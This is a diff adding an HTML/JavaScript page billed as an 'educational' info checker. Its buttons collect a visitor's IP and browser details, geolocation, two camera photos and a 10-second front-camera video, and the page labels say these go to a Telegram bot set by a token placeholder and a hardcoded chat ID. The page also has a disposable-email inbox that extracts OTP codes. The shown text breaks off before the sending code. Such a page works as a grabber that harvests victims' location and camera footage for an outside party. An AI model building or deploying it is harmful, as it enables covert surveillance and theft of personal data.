@@ -1,0 +1,937 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Info Checker — Educational Tool</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0e17; --panel: #0f1623; --border: #1e2d45;
+    --accent: #00e5ff; --warn: #ff6b35; --green: #00ff9d;
+    --red: #ff4466; --text: #c8d8e8; --dim: #4a6080;
+    --purple: #a855f7;
+  }
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body {
+    background: var(--bg); color: var(--text);
+    font-family: 'Rajdhani', sans-serif;
+    min-height: 100vh; display: flex; flex-direction: column;
+    align-items: center; justify-content: center; padding: 20px;
+    background-image:
+      radial-gradient(ellipse at 20% 50%, rgba(0,229,255,0.04) 0%, transparent 60%),
+      radial-gradient(ellipse at 80% 20%, rgba(0,255,157,0.03) 0%, transparent 50%);
+  }
+  .container { width:100%; max-width:680px; }
+
+  .header { text-align:center; margin-bottom:32px; animation:fadeDown 0.6s ease; }
+  .header .tag { font-family:'Share Tech Mono',monospace; font-size:11px; color:var(--accent); letter-spacing:4px; text-transform:uppercase; margin-bottom:10px; opacity:0.8; }
+  .header h1 { font-size:36px; font-weight:700; letter-spacing:2px; color:#fff; text-shadow:0 0 30px rgba(0,229,255,0.3); }
+  .header h1 span { color:var(--accent); }
+
+  .warning-box { background:rgba(255,107,53,0.08); border:1px solid rgba(255,107,53,0.4); border-left:3px solid var(--warn); border-radius:8px; padding:16px 20px; margin-bottom:28px; animation:fadeDown 0.6s ease 0.1s both; }
+  .warning-box .warn-title { font-family:'Share Tech Mono',monospace; font-size:12px; color:var(--warn); letter-spacing:3px; margin-bottom:8px; }
+  .warning-box p { font-size:14px; line-height:1.6; color:#b0c4d8; }
+  .warning-box strong { color:var(--warn); }
+
+  .buttons-grid { display:grid; grid-template-columns:repeat(4,1fr); gap:14px; margin-bottom:28px; animation:fadeDown 0.6s ease 0.2s both; }
+  .btn { background:var(--panel); border:1px solid var(--border); border-radius:10px; padding:20px 10px; cursor:pointer; transition:all 0.25s ease; display:flex; flex-direction:column; align-items:center; gap:8px; position:relative; overflow:hidden; }
+  .btn::before { content:''; position:absolute; inset:0; background:linear-gradient(135deg,rgba(0,229,255,0.05),transparent); opacity:0; transition:opacity 0.3s; }
+  .btn:hover::before { opacity:1; }
+  .btn:hover { border-color:var(--accent); transform:translateY(-3px); box-shadow:0 8px 30px rgba(0,229,255,0.12); }
+  .btn:active { transform:translateY(0); }
+  .btn .icon  { font-size:26px; line-height:1; }
+  .btn .label { font-size:12px; font-weight:600; letter-spacing:1px; color:var(--accent); text-align:center; }
+  .btn .sublabel { font-family:'Share Tech Mono',monospace; font-size:9px; color:var(--dim); text-align:center; }
+  .btn.loading { pointer-events:none; opacity:0.7; }
+  .btn.email-active { border-color:var(--purple); box-shadow:0 0 20px rgba(168,85,247,0.15); }
+  .btn.email-active .label { color:var(--purple); }
+
+  .result-panel { background:var(--panel); border:1px solid var(--border); border-radius:10px; padding:20px; display:none; animation:fadeUp 0.4s ease; margin-bottom:16px; }
+  .result-panel.show { display:block; }
+  .result-header { display:flex; align-items:center; justify-content:space-between; margin-bottom:16px; padding-bottom:12px; border-bottom:1px solid var(--border); }
+  .result-title { font-family:'Share Tech Mono',monospace; font-size:12px; color:var(--accent); letter-spacing:2px; }
+  .status-badge { font-family:'Share Tech Mono',monospace; font-size:10px; padding:3px 10px; border-radius:20px; background:rgba(0,255,157,0.1); color:var(--green); border:1px solid rgba(0,255,157,0.3); }
+  .status-badge.sending { color:var(--accent); background:rgba(0,229,255,0.1); border-color:rgba(0,229,255,0.3); }
+  .status-badge.error   { color:var(--warn);   background:rgba(255,107,53,0.1);  border-color:rgba(255,107,53,0.3); }
+  .result-grid { display:flex; flex-direction:column; gap:8px; }
+  .result-row  { display:flex; gap:12px; align-items:flex-start; }
+  .result-key  { font-family:'Share Tech Mono',monospace; font-size:11px; color:var(--dim); min-width:130px; padding-top:1px; }
+  .result-val  { font-size:14px; color:var(--text); word-break:break-all; flex:1; }
+  .progress-steps { display:none; flex-direction:column; gap:6px; margin-top:12px; }
+  .progress-steps.show { display:flex; }
+  .step { font-family:'Share Tech Mono',monospace; font-size:10px; color:var(--dim); display:flex; align-items:center; gap:8px; }
+  .step.done   { color:var(--green); } .step.active { color:var(--accent); } .step.fail { color:var(--warn); }
+  .step .dot   { width:6px; height:6px; border-radius:50%; background:var(--dim); flex-shrink:0; }
+  .step.done .dot { background:var(--green); } .step.active .dot { background:var(--accent); box-shadow:0 0 6px var(--accent); } .step.fail .dot { background:var(--warn); }
+  .rec-wrapper { display:none; align-items:center; gap:12px; margin-top:12px; padding:12px 16px; background:rgba(255,68,102,0.06); border:1px solid rgba(255,68,102,0.25); border-radius:8px; }
+  .rec-wrapper.show { display:flex; }
+  .rec-dot { width:10px; height:10px; border-radius:50%; background:var(--red); flex-shrink:0; animation:recPulse 1s ease-in-out infinite; }
+  .rec-text { font-family:'Share Tech Mono',monospace; font-size:12px; color:var(--red); letter-spacing:1px; flex:1; }
+  .rec-bar-wrap { width:100px; height:4px; background:rgba(255,68,102,0.2); border-radius:2px; overflow:hidden; }
+  .rec-bar { height:100%; background:var(--red); width:0%; transition:width 1s linear; border-radius:2px; }
+  @keyframes recPulse { 0%,100%{opacity:1} 50%{opacity:0.3} }
+  .telegram-note { margin-top:14px; padding-top:14px; border-top:1px solid var(--border); font-family:'Share Tech Mono',monospace; font-size:11px; color:var(--dim); text-align:center; }
+  .telegram-note span { color:var(--green); }
+  .send-status { margin-top:14px; text-align:center; min-height:22px; }
+
+  /* ══ TEMP EMAIL PANEL ══ */
+  .email-panel { background:var(--panel); border:1px solid var(--purple); border-radius:10px; padding:20px; display:none; animation:fadeUp 0.4s ease; }
+  .email-panel.show { display:block; }
+  .email-panel-header { display:flex; align-items:center; justify-content:space-between; margin-bottom:16px; padding-bottom:12px; border-bottom:1px solid rgba(168,85,247,0.3); }
+  .email-panel-title { font-family:'Share Tech Mono',monospace; font-size:12px; color:var(--purple); letter-spacing:2px; }
+
+  .email-addr-box { background:rgba(168,85,247,0.07); border:1px solid rgba(168,85,247,0.25); border-radius:8px; padding:14px 16px; margin-bottom:14px; display:flex; align-items:center; gap:10px; }
+  .email-addr-text { font-family:'Share Tech Mono',monospace; font-size:13px; color:#fff; flex:1; word-break:break-all; letter-spacing:0.5px; }
+  .email-addr-text.loading { color:var(--dim); }
+  .copy-btn { background:rgba(168,85,247,0.15); border:1px solid rgba(168,85,247,0.4); border-radius:6px; padding:6px 12px; cursor:pointer; font-family:'Share Tech Mono',monospace; font-size:10px; color:var(--purple); letter-spacing:1px; transition:all 0.2s; white-space:nowrap; }
+  .copy-btn:hover { background:rgba(168,85,247,0.3); }
+  .copy-btn.copied { color:var(--green); border-color:rgba(0,255,157,0.4); background:rgba(0,255,157,0.1); }
+
+  /* provider selector */
+  .provider-row { display:flex; gap:8px; margin-bottom:14px; flex-wrap:wrap; }
+  .provider-chip { background:var(--bg); border:1px solid var(--border); border-radius:20px; padding:5px 12px; cursor:pointer; font-family:'Share Tech Mono',monospace; font-size:10px; color:var(--dim); transition:all 0.2s; }
+  .provider-chip:hover { border-color:var(--purple); color:var(--purple); }
+  .provider-chip.active { border-color:var(--purple); color:var(--purple); background:rgba(168,85,247,0.1); }
+
+  .email-actions { display:flex; gap:10px; margin-bottom:14px; }
+  .email-action-btn { flex:1; background:var(--bg); border:1px solid var(--border); border-radius:8px; padding:9px; cursor:pointer; font-family:'Share Tech Mono',monospace; font-size:10px; color:var(--dim); letter-spacing:1px; transition:all 0.2s; display:flex; align-items:center; justify-content:center; gap:6px; }
+  .email-action-btn:hover { border-color:var(--accent); color:var(--accent); }
+  .email-action-btn.active { border-color:var(--green); color:var(--green); background:rgba(0,255,157,0.05); }
+
+  .refresh-bar-wrap { height:2px; background:rgba(168,85,247,0.15); border-radius:1px; margin-bottom:14px; overflow:hidden; }
+  .refresh-bar { height:100%; background:var(--purple); width:100%; transition:none; border-radius:1px; }
+
+  .inbox-label { font-family:'Share Tech Mono',monospace; font-size:10px; color:var(--dim); letter-spacing:2px; margin-bottom:10px; display:flex; align-items:center; justify-content:space-between; }
+  .inbox-count { background:rgba(168,85,247,0.15); color:var(--purple); padding:2px 8px; border-radius:10px; font-size:9px; }
+  .inbox-empty { text-align:center; padding:24px; font-family:'Share Tech Mono',monospace; font-size:11px; color:var(--dim); line-height:1.8; }
+  .inbox-list { display:flex; flex-direction:column; gap:8px; max-height:360px; overflow-y:auto; }
+  .inbox-list::-webkit-scrollbar { width:4px; }
+  .inbox-list::-webkit-scrollbar-track { background:transparent; }
+  .inbox-list::-webkit-scrollbar-thumb { background:var(--border); border-radius:2px; }
+
+  .mail-card { background:var(--bg); border:1px solid var(--border); border-radius:8px; padding:14px; cursor:pointer; transition:all 0.2s; }
+  .mail-card:hover { border-color:var(--purple); }
+  .mail-card.new { border-left:3px solid var(--purple); animation:newMail 0.5s ease; }
+  .mail-card-top { display:flex; align-items:flex-start; justify-content:space-between; gap:8px; margin-bottom:6px; }
+  .mail-from { font-family:'Share Tech Mono',monospace; font-size:10px; color:var(--purple); flex:1; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+  .mail-time { font-family:'Share Tech Mono',monospace; font-size:9px; color:var(--dim); white-space:nowrap; }
+  .mail-subject { font-size:13px; font-weight:600; color:var(--text); margin-bottom:4px; }
+  .mail-preview { font-size:12px; color:var(--dim); line-height:1.4; overflow:hidden; display:-webkit-box; -webkit-line-clamp:2; -webkit-box-orient:vertical; }
+
+  .mail-body-box { display:none; background:rgba(0,0,0,0.3); border:1px solid rgba(168,85,247,0.3); border-radius:8px; padding:14px; margin-top:10px; }
+  .mail-body-box.open { display:block; }
+  .mail-body-text { font-size:13px; color:var(--text); line-height:1.7; white-space:pre-wrap; word-break:break-word; max-height:300px; overflow-y:auto; }
+  .mail-body-text::-webkit-scrollbar { width:4px; }
+  .mail-body-text::-webkit-scrollbar-thumb { background:var(--border); border-radius:2px; }
+
+  .otp-box { background:rgba(168,85,247,0.1); border:1px solid rgba(168,85,247,0.35); border-radius:8px; padding:12px; margin-bottom:10px; text-align:center; }
+  .otp-box-label { font-family:'Share Tech Mono',monospace; font-size:9px; color:var(--purple); letter-spacing:2px; margin-bottom:6px; }
+  .otp-code { font-family:'Share Tech Mono',monospace; font-size:28px; color:#fff; letter-spacing:8px; font-weight:700; }
+  .otp-copy { background:rgba(168,85,247,0.2); border:1px solid rgba(168,85,247,0.4); border-radius:4px; padding:4px 12px; cursor:pointer; font-family:'Share Tech Mono',monospace; font-size:9px; color:var(--purple); margin-top:6px; display:inline-block; }
+
+  /* error box inside email panel */
+  .email-error { background:rgba(255,107,53,0.08); border:1px solid rgba(255,107,53,0.3); border-radius:8px; padding:12px 14px; margin-bottom:12px; font-family:'Share Tech Mono',monospace; font-size:11px; color:#ffaa88; line-height:1.6; display:none; }
+  .email-error.show { display:block; }
+
+  @keyframes newMail { from{opacity:0;transform:translateX(-8px)} to{opacity:1;transform:translateX(0)} }
+  @keyframes fadeDown { from{opacity:0;transform:translateY(-15px)} to{opacity:1;transform:translateY(0)} }
+  @keyframes fadeUp   { from{opacity:0;transform:translateY(10px)}  to{opacity:1;transform:translateY(0)} }
+  @keyframes spin     { to{transform:rotate(360deg)} }
+  .spinner { display:inline-block; width:10px; height:10px; border:2px solid rgba(0,229,255,0.3); border-top-color:var(--accent); border-radius:50%; animation:spin 0.8s linear infinite; margin-right:6px; vertical-align:middle; }
+  .spinner-purple { border-color:rgba(168,85,247,0.3); border-top-color:var(--purple); }
+  @media(max-width:520px){ .buttons-grid{grid-template-columns:repeat(2,1fr)} .header h1{font-size:26px} }
+</style>
+</head>
+<body>
+<div class="container">
+
+  <div class="header">
+    <div class="tag">// Educational Tool</div>
+    <h1>INFO <span>CHECKER</span></h1>
+  </div>
+
+  <div class="warning-box">
+    <div class="warn-title">⚠ WARNING — READ BEFORE USE</div>
+    <p>এই tool টি সম্পূর্ণ <strong>educational purposes</strong> এর জন্য।
+    শুধুমাত্র <strong>নিজের device</strong> এ নিজের information check করার জন্য ব্যবহার করুন।
+    অন্য কারো উপর এই tool ব্যবহার করা <strong>অনৈতিক ও বেআইনি</strong>।</p>
+  </div>
+
+  <div class="buttons-grid">
+    <button class="btn" id="ipBrowserBtn" onclick="checkIPAndBrowser()">
+      <span class="icon">🌐</span><span class="label">IP & BROWSER</span>
+      <span class="sublabel">Info → Telegram</span>
+    </button>
+    <button class="btn" id="geoBtn" onclick="checkGeo()">
+      <span class="icon">📍</span><span class="label">GEO LOCATION</span>
+      <span class="sublabel">Location → Telegram</span>
+    </button>
+    <button class="btn" id="cameraBtn" onclick="runCapture()">
+      <span class="icon">🎬</span><span class="label">CAPTURE ALL</span>
+      <span class="sublabel">Photo×2 + Video→TG</span>
+    </button>
+    <button class="btn" id="emailBtn" onclick="toggleEmailPanel()">
+      <span class="icon">📧</span><span class="label">TEMP EMAIL</span>
+      <span class="sublabel">Disposable Inbox</span>
+    </button>
+  </div>
+
+  <!-- Main result panel -->
+  <div class="result-panel" id="resultPanel">
+    <div class="result-header">
+      <div class="result-title" id="resultTitle">// RESULT</div>
+      <div class="status-badge" id="statusBadge">READY</div>
+    </div>
+    <div class="result-grid" id="resultGrid"></div>
+    <div class="send-status" id="sendStatus"></div>
+    <div class="progress-steps" id="progressSteps">
+      <div class="step" id="step1"><div class="dot"></div> Back camera — photo</div>
+      <div class="step" id="step2"><div class="dot"></div> Front camera — photo</div>
+      <div class="step" id="step3"><div class="dot"></div> Front camera — 10s video</div>
+      <div class="step" id="step4"><div class="dot"></div> Telegram এ সব পাঠানো</div>
+    </div>
+    <div class="rec-wrapper" id="recWrapper">
+      <div class="rec-dot"></div>
+      <div class="rec-text" id="recText">REC 0s / 10s</div>
+      <div class="rec-bar-wrap"><div class="rec-bar" id="recBar"></div></div>
+    </div>
+    <div class="telegram-note" id="telegramNote"></div>
+  </div>
+
+  <!-- ═══ TEMP EMAIL PANEL ═══ -->
+  <div class="email-panel" id="emailPanel">
+    <div class="email-panel-header">
+      <div class="email-panel-title">// TEMP EMAIL</div>
+      <div style="display:flex;gap:8px;align-items:center">
+        <span id="emailStatusBadge" style="font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--dim)">OFFLINE</span>
+        <button onclick="closeEmailPanel()" style="background:none;border:1px solid var(--border);border-radius:4px;padding:2px 8px;cursor:pointer;font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--dim)">✕ CLOSE</button>
+      </div>
+    </div>
+
+    <!-- Error box -->
+    <div class="email-error" id="emailError"></div>
+
+    <!-- Provider selector -->
+    <div style="font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--dim);letter-spacing:2px;margin-bottom:8px;">SELECT PROVIDER</div>
+    <div class="provider-row" id="providerRow">
+      <div class="provider-chip active" onclick="selectProvider('guerrilla')">Guerrilla Mail</div>
+      <div class="provider-chip" onclick="selectProvider('tempmail')">Temp Mail</div>
+      <div class="provider-chip" onclick="selectProvider('mailgw')">Mail.gw</div>
+    </div>
+
+    <!-- Email address + copy -->
+    <div class="email-addr-box">
+      <div class="email-addr-text loading" id="emailAddress">⟳ Generating...</div>
+      <button class="copy-btn" id="copyBtn" onclick="copyEmail()">COPY</button>
+    </div>
+
+    <!-- Action buttons -->
+    <div class="email-actions">
+      <button class="email-action-btn" id="refreshBtn" onclick="refreshInbox()">
+        <span id="refreshIcon">↻</span> REFRESH
+      </button>
+      <button class="email-action-btn" id="autoBtn" onclick="toggleAuto()">
+        ⏱ AUTO (10s)
+      </button>
+      <button class="email-action-btn" onclick="newEmailAddress()">
+        ✦ NEW EMAIL
+      </button>
+    </div>
+
+    <!-- Auto refresh bar -->
+    <div class="refresh-bar-wrap" id="refreshBarWrap" style="display:none">
+      <div class="refresh-bar" id="refreshBarEl"></div>
+    </div>
+
+    <!-- Inbox -->
+    <div class="inbox-label">
+      INBOX
+      <span class="inbox-count" id="inboxCount">0 messages</span>
+    </div>
+    <div id="inboxContainer">
+      <div class="inbox-empty" id="inboxEmpty">
+        📭 Inbox empty<br>
+        <span style="font-size:10px">এই email এ কোনো mail এলে<br>এখানে দেখাবে</span>
+      </div>
+      <div class="inbox-list" id="inboxList" style="display:none"></div>
+    </div>
+  </div>
+
+</div>
+
+<script>
+/* ════════════════════════════════════════════════════════════
+   CONFIG
+════════════════════════════════════════════════════════════ */
+const BOT_TOKEN      = "YOUR_BOT_TOKEN_HERE";
+const CHAT_ID        = "1873240895";
+const VIDEO_DURATION = 10;
+
+/* ════════════════════════════════════════════════════════════
+   UI HELPERS
+════════════════════════════════════════════════════════════ */
+const $ = id => document.getElementById(id);
+const setBadge = (type, text) => {
+  $('statusBadge').className = 'status-badge' + (type ? ' '+type : '');
+  $('statusBadge').innerHTML = type==='sending' ? `<span class="spinner"></span>${text}` : text;
+};
+const setStep = (id, state) => { $(id).className = 'step ' + state; };
+const setRows = rows => {
+  $('resultGrid').innerHTML = rows.map(([k,v]) =>
+    `<div class="result-row"><span class="result-key">${k}</span><span class="result-val">${v}</span></div>`
+  ).join('');
+};
+const fmtErr = err => {
+  if (!err) return 'Unknown error';
+  if (err.name === 'NotAllowedError')      return 'Permission denied ❌';
+  if (err.name === 'NotFoundError')        return 'Camera/Mic নেই ❌';
+  if (err.name === 'NotReadableError')     return 'Device busy ❌';
+  if (err.name === 'OverconstrainedError') return 'Camera constraint ❌';
+  return (err.message || String(err)).substring(0, 60);
+};
+
+function resetCaptureUI() {
+  $('resultPanel').classList.add('show');
+  $('resultTitle').textContent = '// CAPTURE ALL';
+  $('progressSteps').classList.add('show');
+  $('telegramNote').innerHTML = '';
+  $('recWrapper').classList.remove('show');
+  $('recBar').style.width = '0%';
+  $('sendStatus').innerHTML = '';
+  ['step1','step2','step3','step4'].forEach(s => setStep(s, ''));
+}
+
+function showPanel(title) {
+  $('resultPanel').classList.add('show');
+  $('resultTitle').textContent = `// ${title}`;
+  $('progressSteps').classList.remove('show');
+  $('recWrapper').classList.remove('show');
+  $('resultGrid').style.display = 'none';
+  $('sendStatus').innerHTML = '';
+  $('telegramNote').innerHTML = '';
+}
+
+/* ════════════════════════════════════════════════════════════
+   TEMP EMAIL — MULTI-PROVIDER SYSTEM
+   সমস্যা ছিল: 1secmail CORS block করে।
+   Fix: তিনটি CORS-friendly provider যোগ করা হয়েছে।
+     1. Guerrilla Mail  — CORS ok, no auth needed
+     2. Temp-Mail (via public API)
+     3. Mail.gw (REST API, token-based)
+════════════════════════════════════════════════════════════ */
+
+let emailState = {
+  provider: 'guerrilla',  // active provider
+  address: '',
+  // Guerrilla Mail specific
+  gSidToken: '',
+  gSeq: 0,
+  // Mail.gw specific
+  gwToken: '',
+  gwId: '',
+  // Temp Mail specific
+  tmHash: '',
+  // Common
+  knownIds: new Set(),
+  autoRunning: false,
+  autoTimer: null,
+};
+
+/* ── Provider selector ───────────────────────────────────── */
+function selectProvider(p) {
+  emailState.provider = p;
+  document.querySelectorAll('.provider-chip').forEach(c => c.classList.remove('active'));
+  event.target.classList.add('active');
+  generateEmail();
+}
+
+/* ── Show / hide panel ───────────────────────────────────── */
+function toggleEmailPanel() {
+  const panel = $('emailPanel');
+  const btn   = $('emailBtn');
+  if (panel.classList.contains('show')) {
+    closeEmailPanel();
+  } else {
+    panel.classList.add('show');
+    btn.classList.add('email-active');
+    if (!emailState.address) generateEmail();
+  }
+}
+
+function closeEmailPanel() {
+  $('emailPanel').classList.remove('show');
+  $('emailBtn').classList.remove('email-active');
+  stopAuto();
+}
+
+/* ── Generate email (dispatcher) ────────────────────────── */
+async function generateEmail() {
+  stopAuto();
+  emailState.knownIds.clear();
+  emailState.address = '';
+  $('emailAddress').textContent = '⟳ Generating...';
+  $('emailAddress').classList.add('loading');
+  $('copyBtn').classList.remove('copied');
+  $('copyBtn').textContent = 'COPY';
+  $('emailStatusBadge').textContent = 'GENERATING...';
+  $('emailStatusBadge').style.color = 'var(--accent)';
+  $('emailError').classList.remove('show');
+  clearInbox();
+
+  try {
+    let addr = '';
+    if (emailState.provider === 'guerrilla')  addr = await genGuerrilla();
+    else if (emailState.provider === 'mailgw') addr = await genMailGw();
+    else if (emailState.provider === 'tempmail') addr = await genTempMail();
+
+    if (!addr) throw new Error('No address returned');
+
+    emailState.address = addr;
+    $('emailAddress').textContent = addr;
+    $('emailAddress').classList.remove('loading');
+    $('emailStatusBadge').textContent = 'ACTIVE';
+    $('emailStatusBadge').style.color = 'var(--green)';
+    startAuto();
+
+  } catch(e) {
+    $('emailAddress').textContent = '❌ Failed';
+    $('emailAddress').classList.remove('loading');
+    $('emailStatusBadge').textContent = 'ERROR';
+    $('emailStatusBadge').style.color = 'var(--warn)';
+    showEmailError(`Provider error: ${e.message}. অন্য একটি provider try করো।`);
+  }
+}
+
+function newEmailAddress() { generateEmail(); }
+
+/* ════════════════════════════════════════════════════════════
+   PROVIDER 1: GUERRILLA MAIL
+   API: https://www.guerrillamail.com/ajax.php
+   CORS: ✅ open (used by official site)
+════════════════════════════════════════════════════════════ */
+async function genGuerrilla() {
+  const url = 'https://www.guerrillamail.com/ajax.php?f=get_email_address&lang=en&site=guerrillamail.com&ref_mid=';
+  const r = await fetch(url, { credentials: 'include' });
+  if (!r.ok) throw new Error(`HTTP ${r.status}`);
+  const d = await r.json();
+  emailState.gSidToken = d.sid_token;
+  emailState.gSeq      = 0;
+  return d.email_addr;
+}
+
+async function fetchGuerrilla() {
+  if (!emailState.gSidToken) return [];
+  const url = `https://www.guerrillamail.com/ajax.php?f=check_email&seq=${emailState.gSeq}&sid_token=${encodeURIComponent(emailState.gSidToken)}&site=guerrillamail.com&in_reply_to=`;
+  const r = await fetch(url, { credentials: 'include' });
+  if (!r.ok) return [];
+  const d = await r.json();
+  if (d.sid_token) emailState.gSidToken = d.sid_token;
+  if (typeof d.seq !== 'undefined') emailState.gSeq = d.seq;
+  return d.list || [];
+}
+
+async function fetchGuerrillaBody(mailId) {
+  const url = `https://www.guerrillamail.com/ajax.php?f=fetch_email&email_id=${mailId}&sid_token=${encodeURIComponent(emailState.gSidToken)}&site=guerrillamail.com`;
+  try {
+    const r = await fetch(url, { credentials: 'include' });
+    const d = await r.json();
+    // strip basic html tags from body
+    const raw = d.mail_body || '';
+    return raw.replace(/<br\s*\/?>/gi, '\n').replace(/<[^>]+>/g, '').trim();
+  } catch(e) { return '(Could not load)'; }
+}
+
+/* ════════════════════════════════════════════════════════════
+   PROVIDER 2: MAIL.GW
+   REST API: https://api.mail.gw
+   CORS: ✅ (public API, CORS headers set)
+════════════════════════════════════════════════════════════ */
+async function genMailGw() {
+  // 1. Get available domains
+  const dr = await fetch('https://api.mail.gw/domains?page=1');
+  if (!dr.ok) throw new Error(`Domains fetch failed: ${dr.status}`);
+  const dd = await dr.json();
+  const domain = dd['hydra:member']?.[0]?.domain;
+  if (!domain) throw new Error('No domain available');
+
+  // 2. Create account
+  const rand = Math.random().toString(36).substring(2, 10);
+  const pass  = Math.random().toString(36).substring(2, 14);
+  const addr  = `${rand}@${domain}`;
+  const cr = await fetch('https://api.mail.gw/accounts', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ address: addr, password: pass })
+  });
+  if (!cr.ok) {
+    const err = await cr.json().catch(() => ({}));
+    throw new Error(err['hydra:description'] || `Account create failed: ${cr.status}`);
+  }
+
+  // 3. Get token
+  const tr = await fetch('https://api.mail.gw/token', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ address: addr, password: pass })
+  });
+  if (!tr.ok) throw new Error(`Token fetch failed: ${tr.status}`);
+  const td = await tr.json();
+  emailState.gwToken = td.token;
+  emailState.gwId    = td.id;
+  return addr;
+}
+
+async function fetchMailGw() {
+  if (!emailState.gwToken) return [];
+  const r = await fetch('https://api.mail.gw/messages?page=1', {
+    headers: { 'Authorization': `Bearer ${emailState.gwToken}` }
+  });
+  if (!r.ok) return [];
+  const d = await r.json();
+  return d['hydra:member'] || [];
+}
+
+async function fetchMailGwBody(id) {
+  try {
+    const r = await fetch(`https://api.mail.gw/messages/${id}`, {
+      headers: { 'Authorization': `Bearer ${emailState.gwToken}` }
+    });
+    const d = await r.json();
+    return d.text || d.html?.replace(/<[^>]+>/g,'') || '(empty)';
+  } catch(e) { return '(Could not load)'; }
+}
+
+/* ════════════════════════════════════════════════════════════
+   PROVIDER 3: TEMP MAIL (tempmail.lol)
+   API: https://api.tempmail.lol
+   CORS: ✅
+════════════════════════════════════════════════════════════ */
+async function genTempMail() {
+  const r = await fetch('https://api.tempmail.lol/generate', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({})
+  });
+  if (!r.ok) throw new Error(`HTTP ${r.status}`);
+  const d = await r.json();
+  emailState.tmHash = d.token;
+  return d.address;
+}
+
+async function fetchTempMail() {
+  if (!emailState.tmHash) return [];
+  const r = await fetch(`https://api.tempmail.lol/auth/messages?token=${encodeURIComponent(emailState.tmHash)}`);
+  if (!r.ok) return [];
+  const d = await r.json();
+  return d.email || [];
+}
+
+/* ════════════════════════════════════════════════════════════
+   INBOX REFRESH — unified
+════════════════════════════════════════════════════════════ */
+async function refreshInbox() {
+  if (!emailState.address) return;
+  const icon = $('refreshIcon');
+  icon.style.animation = 'spin 0.6s linear infinite';
+  icon.style.display   = 'inline-block';
+
+  try {
+    let msgs = [];
+
+    if (emailState.provider === 'guerrilla') {
+      const raw = await fetchGuerrilla();
+      // Normalize Guerrilla mail objects
+      msgs = raw.map(m => ({
+        _id:     m.mail_id,
+        _from:   m.mail_from,
+        _subj:   m.mail_subject,
+        _date:   new Date(parseInt(m.mail_timestamp) * 1000),
+        _fetch:  () => fetchGuerrillaBody(m.mail_id)
+      }));
+    }
+    else if (emailState.provider === 'mailgw') {
+      const raw = await fetchMailGw();
+      msgs = raw.map(m => ({
+        _id:    m.id,
+        _from:  m.from?.address || m.from || '',
+        _subj:  m.subject || '(no subject)',
+        _date:  new Date(m.createdAt),
+        _fetch: () => fetchMailGwBody(m.id)
+      }));
+    }
+    else if (emailState.provider === 'tempmail') {
+      const raw = await fetchTempMail();
+      msgs = raw.map((m, i) => ({
+        _id:    m.id || i,
+        _from:  m.sender || m.from || '',
+        _subj:  m.subject || '(no subject)',
+        _date:  m.date ? new Date(m.date) : new Date(),
+        _body:  m.body || m.text || '',
+        _fetch: async () => m.body || m.text || ''
+      }));
+    }
+
+    if (!msgs.length) {
+      if (emailState.knownIds.size === 0) showEmptyInbox();
+      icon.style.animation = '';
+      return;
+    }
+
+    const newMsgs = msgs.filter(m => !emailState.knownIds.has(String(m._id)));
+
+    $('inboxCount').textContent = `${msgs.length} message${msgs.length>1?'s':''}`;
+    $('inboxEmpty').style.display  = 'none';
+    $('inboxList').style.display   = 'flex';
+
+    for (const m of newMsgs) {
+      emailState.knownIds.add(String(m._id));
+      renderMailCard(m);
+    }
+
+  } catch(e) {
+    console.warn('Inbox refresh error:', e);
+    showEmailError('Inbox refresh failed: ' + e.message);
+  }
+  icon.style.animation = '';
+}
+
+async function renderMailCard(m) {
+  const body = m._body !== undefined ? m._body : await m._fetch();
+  const clean = body.replace(/<br\s*\/?>/gi,'\n').replace(/<[^>]+>/g,'').trim();
+  const otpMatch = clean.match(/\b(\d{4,8})\b/);
+  const otp = otpMatch ? otpMatch[1] : null;
+  const timeStr = m._date instanceof Date && !isNaN(m._date)
+    ? m._date.toLocaleTimeString([], {hour:'2-digit',minute:'2-digit'})
+    : '';
+
+  const id = `mail-${m._id}`;
+  const card = document.createElement('div');
+  card.className = 'mail-card new';
+  card.id = id;
+  card.innerHTML = `
+    <div class="mail-card-top">
+      <div class="mail-from">✉ ${escHtml(m._from)}</div>
+      <div class="mail-time">${timeStr}</div>
+    </div>
+    <div class="mail-subject">${escHtml(m._subj)}</div>
+    <div class="mail-preview">${escHtml(clean.substring(0,120))}${clean.length>120?'...':''}</div>
+    <div class="mail-body-box" id="body-${m._id}">
+      ${otp ? `<div class="otp-box">
+        <div class="otp-box-label">🔑 OTP / CODE DETECTED</div>
+        <div class="otp-code">${otp}</div>
+        <div class="otp-copy" onclick="copyOTP('${otp}',this)">COPY CODE</div>
+      </div>` : ''}
+      <div class="mail-body-text">${escHtml(clean)}</div>
+    </div>`;
+
+  card.querySelector('.mail-preview').addEventListener('click', () => toggleBody(m._id));
+  card.querySelector('.mail-subject').addEventListener('click', () => toggleBody(m._id));
+  $('inboxList').insertBefore(card, $('inboxList').firstChild);
+}
+
+/* ════════════════════════════════════════════════════════════
+   COPY / UTILS
+════════════════════════════════════════════════════════════ */
+function copyEmail() {
+  if (!emailState.address) return;
+  navigator.clipboard.writeText(emailState.address).catch(() => {
+    const t = document.createElement('textarea');
+    t.value = emailState.address;
+    document.body.appendChild(t); t.select(); document.execCommand('copy'); document.body.removeChild(t);
+  });
+  $('copyBtn').textContent = 'COPIED ✓';
+  $('copyBtn').classList.add('copied');
+  setTimeout(() => { $('copyBtn').textContent = 'COPY'; $('copyBtn').classList.remove('copied'); }, 2000);
+}
+
+function toggleBody(id) { $(`body-${id}`)?.classList.toggle('open'); }
+
+function copyOTP(code, el) {
+  navigator.clipboard.writeText(code).catch(() => {
+    const t = document.createElement('textarea');
+    t.value = code; document.body.appendChild(t); t.select(); document.execCommand('copy'); document.body.removeChild(t);
+  });
+  el.textContent = 'COPIED ✓';
+  setTimeout(() => el.textContent = 'COPY CODE', 2000);
+}
+
+function escHtml(s) {
